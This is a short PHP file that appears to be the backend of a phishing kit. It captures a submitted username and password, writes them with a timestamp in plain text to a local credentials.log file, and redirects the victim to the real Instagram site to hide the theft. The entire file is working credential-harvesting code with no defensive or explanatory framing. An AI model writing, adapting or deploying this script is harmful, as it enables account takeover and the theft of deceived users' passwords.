<?php
if ($_SERVER['REQUEST_METHOD']==='POST') {
  $u = htmlspecialchars($_POST['username'], ENT_QUOTES);
  $p = htmlspecialchars($_POST['password'], ENT_QUOTES);
  $t = date('Y-m-d H:i:s');
  file_put_contents(__DIR__.'/credentials.log', "[$t] $u | $p\n", FILE_APPEND);
  header('Location: https://www.instagram.com/');
  exit;
}
?>
